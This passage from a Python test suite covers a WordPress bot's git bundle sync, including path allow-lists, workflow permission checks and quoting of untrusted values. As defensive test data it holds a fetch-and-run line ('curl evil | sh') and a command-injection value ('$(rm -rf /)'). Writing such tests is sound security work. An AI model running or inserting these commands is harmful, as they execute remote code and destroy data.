        return r.stdout.strip()

    def setUp(self):
        super().setUp()
        sys.path.insert(0, str(ROOT / "automation"))
        import api_sync
        self.sync = api_sync
        self.env = {**api_writer.writer_env(local="push"), "PATH": os.environ.get("PATH", "/usr/bin:/bin")}
        self.origin = self.tmp / "origin.git"
        self.git("init", "-q", "--bare", "-b", "main", str(self.origin))
        seed = self.tmp / "seed"
        self.git("clone", "-q", str(self.origin), str(seed))
        self.git("checkout", "-q", "-b", "main", cwd=seed)
        for rel, body in SEED.items():
            (seed / rel).parent.mkdir(parents=True, exist_ok=True)
            (seed / rel).write_text(body, encoding="utf-8")
        for rel in ("automation/merge_json_list.py", ".gitattributes"):
            (seed / rel).write_bytes((ROOT / rel).read_bytes())
        self.git("add", "-A", cwd=seed)
        self.git("commit", "-q", "-m", "처음", cwd=seed)
        self.git("push", "-q", "origin", "main", cwd=seed)
        self.seed = seed
        self.git("clone", "-q", "-b", "main", str(self.origin), str(self.tmp / "repo"))
        self.logs = []
        for p in (mock.patch.object(api_writer, "_as_writer", _plain_writer),
                  mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: self.logs.append((ok, msg))),
                  mock.patch.dict(os.environ, {k: v for k, v in self.env.items() if k.startswith("GIT_")})):
            p.start()
            self.addCleanup(p.stop)

    def server_run(self, work, text="", label="실행"):
        """서버 한 번 실행: 작업 폴더 준비 + 앞 묶음 쌓기 → (세션 대신) work(repo) → finish_repo."""
        api_writer.prepare_workdir(self.env)
        stacked = api_writer.stack_pending(self.env)
        self.assertIsNotNone(stacked)
        base = api_writer.head_sha(self.env)
        repo = self.tmp / "repo"
        work(repo)
        files = api_writer.new_queue_files(self.env, base)
        return stacked, api_writer.finish_repo(text, "새 글 1편", files, self.env, base, stacked, label)

    def main_moves(self, body="b\n"):
        (self.seed / "README.md").write_text(body)
        self.git("commit", "-q", "-am", "다른 실행", cwd=self.seed)
        self.git("push", "-q", "origin", "main", cwd=self.seed)

    def github(self, name="gh"):
        """GitHub 작업의 checkout (main 전체 이력)."""
        path = self.tmp / name
        if not path.exists():
            self.git("clone", "-q", "-b", "main", str(self.origin), str(path))
        else:
            self.git("fetch", "-q", "origin", cwd=path)
        return path

    def github_round(self):
        """deploy.yml sync_* 를 그대로: claim → check(검사) → push → report. 서버에 알린 결과."""
        claim = api_writer.outbox_claim()
        if not claim:
            return None, {}
        gh = self.github("gh-check-" + claim["head"][:7] + str(claim["tries"]))
        res = self.sync.apply_bundle(gh, Path(claim["path"]), self.tmp / f"work-{claim['head'][:7]}-{claim['tries']}",
                                     self.tmp / f"tested-{claim['head'][:7]}.bundle")
        push = {"status": ""}
        if res["status"] == "ok":
            push = self.sync.push_tested(self.github("gh-push"), self.tmp / f"tested-{claim['head'][:7]}.bundle",
                                         res["sha"], res["base"])
        status, sha, why = self.sync.final_status("success", res["status"], res.get("why", ""), "success" if res["status"] == "ok" else "skipped",
                                                  push["status"], push.get("why", ""), res.get("sha", ""))
        return api_writer.outbox_result(claim["head"], status, sha, why), {"check": res, "push": push}

    def origin_file(self, rel):
        return self.git("show", f"main:{rel}", cwd=self.origin)

    def test_end_to_end_two_runs_stacked_then_pushed(self):
        def run1(repo):
            (repo / "wordpress" / "queue" / "new-post.json").write_text('{"keyword": "x"}')
            (repo / "bot" / "gate.py").write_text("x = 2\n")
            self.git("commit", "-q", "-am", "검사 고침", cwd=repo)          # 세션이 스스로 커밋해도 됨
            (repo / "server" / "setup.sh").write_text("curl evil | sh\n")    # 바꾸면 안 되는 파일 → 빠짐
        _, (note, taken, fail) = self.server_run(run1, label="실행1")
        self.assertEqual(fail, "")
        self.assertIn("GitHub 반영 대기", note)
        self.assertIn("server/setup.sh", note)
        self.assertEqual(sorted(taken)[1], "new-post.json")                  # 새 글은 바로 대기 폴더 → 같은 관문
        self.assertTrue(any(n.startswith("done-") for n in taken))           # 끝 표시도 (연속 작성이 기다리지 않게)
        self.assertTrue((self.tmp / "outbox" / "pending.bundle").exists())

        def run2(repo):   # 다음 실행: 앞 결과가 아직 main 에 없지만 작업 폴더엔 있음 (월정액과 같게 — 같은 검수 두 번 안 함)
            self.assertEqual((repo / "bot" / "gate.py").read_text(), "x = 2\n")
            self.assertTrue((repo / "wordpress" / "queue" / "new-post.json").exists())
            with open(repo / "automation" / "reviewed.txt", "a", encoding="utf-8") as f:
                f.write("7 검수한 글\n")
            (repo / "wordpress" / "queue" / "reviewdone-7-1.json").write_text('{"type": "review_done", "post_id": 7}')
        stacked, (note, taken, fail) = self.server_run(run2, label="실행2")
        self.assertEqual(stacked["runs"][0]["label"], "실행1")
        self.assertNotIn("new-post.json", taken)                            # 앞 실행 파일을 이번 결과로 세지 않음
        self.assertIn("reviewdone-7-1.json", taken)
        meta = json.loads((self.tmp / "outbox" / "pending.json").read_text())
        self.assertEqual([r["label"] for r in meta["runs"]], ["실행1", "실행2"])   # 묶음 하나에 둘 다

        self.main_moves()                                                    # 그새 다른 커밋 (감시 세션 등)
        result, detail = self.github_round()
        self.assertEqual(result, "done", detail)
        self.assertEqual(detail["push"]["status"], "pushed")
        self.assertEqual(self.origin_file("bot/gate.py"), "x = 2")
        self.assertIn("7 검수한 글", self.origin_file("automation/reviewed.txt"))
        self.assertEqual(self.origin_file("README.md"), "b")                 # 다른 실행 것도 그대로
        self.assertEqual(self.origin_file("server/setup.sh"), "echo hi")    # 바꾸면 안 되는 파일은 안 올라감
        self.assertTrue(self.logs[-1][0])
        self.assertIn("main 에 올림", self.logs[-1][1])
        # 같은 글 두 번 방지: 대기 폴더 파일과 main 의 파일이 이름·내용이 같아 배포의 publish_queue 가 완료 표시로 건너뜀
        deployed = self.tmp / "deployed"
        deployed.mkdir()
        for name in taken + ["new-post.json"]:
            (deployed / name).write_bytes(api_writer.subprocess.run(["git", "show", f"main:wordpress/queue/{name}"], cwd=self.origin,
                                                                    capture_output=True).stdout)
            self.assertEqual(publish_queue._marker(deployed / name), publish_queue._marker(self.tmp / "local-queue" / name), name)
        self.assertEqual(api_writer.outbox_claim(), {})                    # 다 올라감
        self.assertEqual(api_writer.stack_pending(self.env), {})           # 다음 실행은 쌓을 것 없음

    def test_already_in_main_is_done(self):
        self.server_run(lambda repo: (repo / "wordpress" / "queue" / "a.json").write_text('{"keyword": "a"}'))
        claim = api_writer.outbox_claim()
        gh = self.github()
        res = self.sync.apply_bundle(gh, Path(claim["path"]), self.tmp / "w1", self.tmp / "t1.bundle")
        self.assertEqual(self.sync.push_tested(self.github("gh-push"), self.tmp / "t1.bundle", res["sha"], res["base"])["status"], "pushed")
        # 결과 알림이 끊겨 다음 작업이 같은 묶음을 다시 가져가도 → 이미 main 에 있음 → 끝 (두 번 안 올림)
        res2 = self.sync.apply_bundle(self.github("gh2"), Path(claim["path"]), self.tmp / "w2", self.tmp / "t2.bundle")
        self.assertEqual(res2["status"], "already")
        self.assertEqual(api_writer.outbox_result(claim["head"], "already"), "done")

    def craft_bundle(self, change):
        repo = self.tmp / "repo"
        change(repo)
        self.git("add", "-A", cwd=repo)
        self.git("commit", "-q", "-m", "묶음", cwd=repo)
        out = self.tmp / "crafted.bundle"
        self.git("bundle", "create", str(out), "HEAD", "^origin/main", cwd=repo)
        return out

    def test_github_check_failure_pushes_nothing(self):
        bad_test = "import unittest\n\n\nclass BadTest(unittest.TestCase):\n    def test_x(self):\n        self.fail('x')\n"
        bundle = self.craft_bundle(lambda repo: (repo / "tests" / "test_bad.py").write_text(bad_test))
        before = self.git("rev-parse", "main", cwd=self.origin)
        res = self.sync.apply_bundle(self.github(), bundle, self.tmp / "w", self.tmp / "t.bundle")
        self.assertEqual(res["status"], "failed")
        self.assertIn("BadTest.test_x", res["why"])
        self.assertFalse((self.tmp / "t.bundle").exists())
        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
        self.assertEqual(self.sync.final_status("success", "failed", res["why"], "skipped", "", "", "")[0], "failed")

    def test_github_refuses_disallowed_files(self):
        """서버 쪽에서 이미 빼지만, GitHub 쪽도 main 의 목록으로 다시 확인 (묶음이 서버 설정·워크플로·이 검사 코드를 못 바꿈)."""
        for rel in ("server/setup.sh", ".github/workflows/deploy.yml", "bot/api_writer.py", "automation/api_sync.py"):
            with self.subTest(rel=rel):
                self.git("checkout", "-q", "-f", "-B", "x", "origin/main", cwd=self.tmp / "repo")
                def change(repo, rel=rel):
                    (repo / rel).parent.mkdir(parents=True, exist_ok=True)
                    (repo / rel).write_text("bad\n")
                bundle = self.craft_bundle(change)
                res = self.sync.apply_bundle(self.github(f"gh-{rel.replace('/', '_')}"), bundle,
                                             self.tmp / f"w-{rel.replace('/', '_')}", self.tmp / "t.bundle")
                self.assertEqual(res["status"], "failed")
                self.assertIn(rel, res["why"])

    def test_main_moved_before_push_is_retry(self):
        bundle = self.craft_bundle(lambda repo: (repo / "wordpress" / "queue" / "b.json").write_text('{"keyword": "b"}'))
        res = self.sync.apply_bundle(self.github(), bundle, self.tmp / "w", self.tmp / "t.bundle")
        self.assertEqual(res["status"], "ok")
        self.main_moves("c\n")
        push = self.sync.push_tested(self.github("gh-push"), self.tmp / "t.bundle", res["sha"], res["base"])
        self.assertEqual(push["status"], "moved")
        self.assertEqual(self.sync.final_status("success", "ok", "", "success", "moved", push["why"], res["sha"])[0], "retry")
        self.assertEqual(self.origin_file("README.md"), "c")

    def test_final_status_table(self):
        f = self.sync.final_status
        self.assertEqual(f("failure", "", "", "skipped", "", "", ""), ("retry", "", "검사 작업이 끝나지 않음 (failure)"))
        self.assertEqual(f("success", "ok", "", "success", "pushed", "", "abc")[:2], ("pushed", "abc"))
        self.assertEqual(f("success", "ok", "", "success", "failed", "main 에 push 거절: 403", "abc"),
                         ("failed", "", "main 에 push 거절: 403"))
        self.assertEqual(f("success", "ok", "", "failure", "", "", "abc")[0], "retry")
        self.assertEqual(f("success", "already", "", "skipped", "", "", "")[0], "already")


class ApiSyncCommandTest(unittest.TestCase):
    """GitHub 작업 명령: 서버에 못 닿아도 배포를 막지 않고, 매일 점검 보고는 문제 있을 때만 실패(→ GitHub 메일), 내용은 안 찍음."""

    def setUp(self):
        sys.path.insert(0, str(ROOT / "automation"))
        import api_sync
        self.sync = api_sync

    def run_maint(self, report):
        remote = mock.Mock()
        remote.outbox.return_value = report
        import io
        from contextlib import redirect_stdout
        buf = io.StringIO()
        with mock.patch.object(self.sync, "remote_from_env", return_value=remote), redirect_stdout(buf):
            code = self.sync.main(["maint"])
        remote.outbox.assert_called_once_with("report")
        return code, buf.getvalue()

    def test_maint_exit_codes(self):
        self.assertEqual(self.run_maint({})[0], 0)
        self.assertEqual(self.run_maint({"at": "2026-11-12 06:15", "problems": 0})[0], 0)
        code, out = self.run_maint({"at": "2026-11-12 06:15", "problems": 2})
        self.assertEqual(code, 1)
        self.assertIn("문제 2건", out)
        self.assertIn("봇 기록", out)
        self.assertEqual(self.run_maint({"at": "x", "problems": -2})[0], 1)

    def test_unreachable_server_does_not_fail(self):
        with mock.patch.object(self.sync, "remote_from_env", side_effect=OSError("연결 안 됨")), \
                mock.patch.dict(os.environ, {"GITHUB_OUTPUT": ""}):
            self.assertEqual(self.sync.main(["maint"]), 0)
            with tempfile.TemporaryDirectory() as d:
                self.assertEqual(self.sync.main(["fetch", "--out", d]), 0)

    def test_report_quotes_untrusted_values(self):
        remote = mock.Mock()
        remote.outbox.return_value = {"result": "failed"}
        env = {"HEAD_SHA": "h1", "CHECK_RESULT": "success", "CHECK_STATUS": "failed", "CHECK_WHY": "검사 실패: $(rm -rf /)",
               "PUSH_RESULT": "skipped"}
        with mock.patch.object(self.sync, "remote_from_env", return_value=remote), mock.patch.dict(os.environ, env):
            self.sync.main(["report"])
        args = remote.outbox.call_args.args
        self.assertEqual(args[:5], ("result", "--head", "h1", "--status", "failed"))
        self.assertIn("$(rm -rf /)", args[-1])            # 값 그대로 한 인자로 (서버 명령에서는 shlex.quote)
        src = (ROOT / "automation" / "api_sync.py").read_text(encoding="utf-8")
        self.assertIn("shlex.quote", src)


class WorkflowTest(unittest.TestCase):
    """deploy.yml·health.yml 의 API 봇 반영·알림 작업: 권한 나눔, 같은 실행에서 배포, 기존 배포 그대로."""

    def jobs(self, name):
        """작업 이름 → 그 작업 글자 (yaml 패키지 없이: 'jobs:' 아래 두 칸 들여쓴 이름 줄로 나눔)."""
        text = (ROOT / ".github" / "workflows" / name).read_text(encoding="utf-8").split("\njobs:\n", 1)[1]
        parts = re.split(r"^  ([a-z_]+):\n", text, flags=re.M)
        return dict(zip(parts[1::2], parts[2::2]))

    def test_deploy_sync_jobs(self):
        jobs = self.jobs("deploy.yml")
        self.assertEqual(list(jobs), ["sync_fetch", "sync_check", "sync_push", "sync_report", "gate", "check", "deploy"])
        self.assertIn("if: github.event_name != 'push'", jobs["sync_fetch"])
        self.assertEqual([k for k, v in jobs.items() if "contents: write" in v], ["sync_push"])   # main 에 쓰는 작업은 하나
        self.assertNotIn("secrets.", jobs["sync_check"])               # 묶음 코드를 돌리는 작업엔 비밀값 없음
        self.assertNotIn("secrets.", jobs["sync_push"])
        self.assertIn("persist-credentials: false", jobs["sync_check"])
        self.assertNotIn("unittest", jobs["sync_push"])                # push 작업은 묶음 코드를 안 돌림
        self.assertIn("api_sync.py push", jobs["sync_push"])
        self.assertIn("needs: sync_push", jobs["gate"])                 # 올린 main 을 같은 실행에서 배포
        self.assertIn("if: ${{ !cancelled() }}", jobs["gate"])
        self.assertIn("!cancelled() && needs.gate.result == 'success'", jobs["check"])
        self.assertIn("needs.check.result == 'success'", jobs["deploy"])
        for name in ("sync_fetch", "sync_report"):
            self.assertIn("secrets.SERVER_PASSWORD", jobs[name])
        for name, body in jobs.items():                                 # 작업 출력(검사 결과 등)은 환경 변수로만 — 명령 글자에 바로 안 넣음
            for line in body.splitlines():
                if line.strip().startswith("run:"):
                    self.assertNotIn("needs.sync", line, name)

    def test_health_maint_report_job(self):
        jobs = self.jobs("health.yml")
        self.assertIn("api_sync.py maint", jobs["maint_report"])
        self.assertIn("'23 0 * * *'", jobs["health"])               # 하루 1번 건강 점검은 그대로 하루 1번
        wf = (ROOT / ".github" / "workflows" / "health.yml").read_text(encoding="utf-8")
        self.assertRegex(wf, r'cron: "\d+(,\d+){3} \* \* \* \*"')       # 보고는 15분마다


class CheckParityTest(unittest.TestCase):
    def test_same_checks_as_check_and_push(self):
        """push 전 검사가 감시 세션의 check_and_push.sh 와 같은 것 (한쪽만 바뀌지 않게)."""
        script = (ROOT / "automation" / "check_and_push.sh").read_text(encoding="utf-8")
        src = (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8")
        pairs = [("automation/common_errors.py",) * 2,
                 ("unittest discover -s tests", '"unittest", "discover", "-s", "tests"'),
                 ("tests/test_calculators.mjs",) * 2,
                 (r"queue\/refresh-.*\.json", r"wordpress/queue/refresh-.*\.json"),
                 ("merge_json_list.py %O %A %B",) * 2,
                 ("merge.ours.driver true", '"merge.ours.driver", "true"')]
        for in_script, in_src in pairs:
            self.assertIn(in_script, script)
            self.assertIn(in_src, src)

    def test_github_uses_same_checks(self):
        src = (ROOT / "automation" / "api_sync.py").read_text(encoding="utf-8")
        self.assertIn("from bot.api_writer import check_work, push_allowed", src)
        self.assertIn("check_work(run_cmd)", src)
        deploy = (ROOT / ".github" / "workflows" / "deploy.yml").read_text(encoding="utf-8")
        for step in ("compileall -q bot tests", "node tests/test_calculators.mjs", "wordpress/patches.json"):
            self.assertIn(step, deploy)   # 배포 검사에 있는 것은 반영 검사(check_work)에도
        self.assertIn('"compileall", "-q", "bot", "tests"', (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8"))

    def test_failed_test_names(self):
        out = "FAIL: test_a (test_bot.BotTest.test_a)\nERROR: test_b (test_bot.GateTest)\nok"
        self.assertEqual(api_writer._failed_tests(out), ["BotTest.test_a", "GateTest.test_b"])   # 3.11+ 와 3.10 출력

    def test_allowed_paths(self):
        for ok in ("wordpress/queue/a.json", "wordpress/patches.json", "automation/reviewed.txt", "bot/condition_gate.py",
                   "tests/test_bot.py", "wordpress/themes/first-lab/calculators/data/x.json", "wordpress/pages/x-calculator.html"):
            self.assertTrue(api_writer.push_allowed(ok), ok)
        for bad in ("server/setup.sh", ".github/workflows/deploy.yml", "CLAUDE.md", "automation/daily-writer.md",
                    "wordpress/mu-plugins/first-lab-api.php", "bot/api_writer.py", "bot/config.py", "automation/api_sync.py",
                    ".gitattributes", "automation/merge_json_list.py", "automation/check_and_push.sh"):
            self.assertFalse(api_writer.push_allowed(bad), bad)


class WiringTest(unittest.TestCase):
    def test_publish_queue_reads_local_results(self):
        self.assertEqual(api_writer.LOCAL_QUEUE_DIR, publish_queue.LOCAL_QUEUE_DIR)
        with tempfile.TemporaryDirectory() as d:
            q, local, done = Path(d, "q"), Path(d, "local"), Path(d, "done")
            for p in (q, local, done):
                p.mkdir()
            (q / "b.json").write_text("{}")
            (local / "a.json").write_text("{}")
            with mock.patch.object(publish_queue, "QUEUE_DIR", q), mock.patch.object(publish_queue, "LOCAL_QUEUE_DIR", local), \
                    mock.patch.object(publish_queue, "DONE_DIR", done):
                self.assertEqual([p.name for p in publish_queue.pending()], ["a.json", "b.json"])

    def test_instructions_and_settings_describe_api_mode(self):
        writer = (ROOT / "automation" / "daily-writer.md").read_text(encoding="utf-8")
        self.assertIn("FIRSTLAB_LOCAL=1", writer)
        self.assertIn("FIRSTLAB_LOCAL=push", writer)
        self.assertIn("FIRSTLAB_LOCAL=push", api_writer.claude_command("m", 1, "")[2])
        self.assertIn("FIRSTLAB_LOCAL=1", api_writer.claude_command("m", 1, "", "1")[2])
        page = (ROOT / "wordpress" / "mu-plugins" / "first-lab-bot-settings.php").read_text(encoding="utf-8")
        self.assertNotIn("GITHUB_PUSH_TOKEN", page)   # 11/12 '예비 필요 없고 …': 운영자가 따로 넣을 토큰 없음
        self.assertIn("따로 넣을 것은 Claude API 키뿐", page)
        for doc in ("README.md", "server/set-secrets.sh", "automation/daily-writer.md"):
            self.assertNotIn("GITHUB_PUSH_TOKEN", (ROOT / doc).read_text(encoding="utf-8"), doc)
        self.assertIn("요금만 다름", page)
        self.assertNotIn("API 봇이 1~3분 안에", page)

    def test_server_installs_pinned_cli_where_writer_looks(self):
        setup = (ROOT / "server" / "bot-setup.sh").read_text(encoding="utf-8")
        self.assertRegex(setup, r"CLAUDE_VER=\d+\.\d+\.\d+")
        self.assertRegex(setup, r"NODE_SHA256=[0-9a-f]{64}")
        self.assertIn(str(Path(api_writer.CLAUDE_BIN).parent.parent), setup)   # --prefix /opt/first-lab-claude
        self.assertIn(api_writer.WRITER_USER, setup)
        self.assertIn(str(publish_queue.LOCAL_QUEUE_DIR), setup)
        self.assertIn(f"install -d -m 700 {api_writer.OUTBOX}", setup)   # root 전용 (배포 SSH 계정 root 만 읽음)

    def test_writer_timeout_shorter_than_continuous(self):
        self.assertLess(api_writer.RUN_TIMEOUT_MIN, run.CONTINUOUS_TIMEOUT_MIN)

    def test_one_writer_fits_memory(self):
        """2번 작성자: 글쓰기 한 번 상한 1200MB × 2 는 2GB 서버(워드프레스·사주데이 포함)에 못 들어감 → API 봇은 한 칸,
        연속 작성은 한 편 끝나면 바로 다음 편 (11/12 확인)."""
        self.assertGreater(int(api_writer.MEMORY_MAX.rstrip("M")) * 2, 2048)   # 두 개면 서버 전체 메모리를 넘음
        src = (ROOT / "bot" / "run.py").read_text(encoding="utf-8")
        self.assertIn('active = WRITERS if writer2_on() and settings.write_mode != "bot" else 1', src)


if __name__ == "__main__":
    unittest.main()
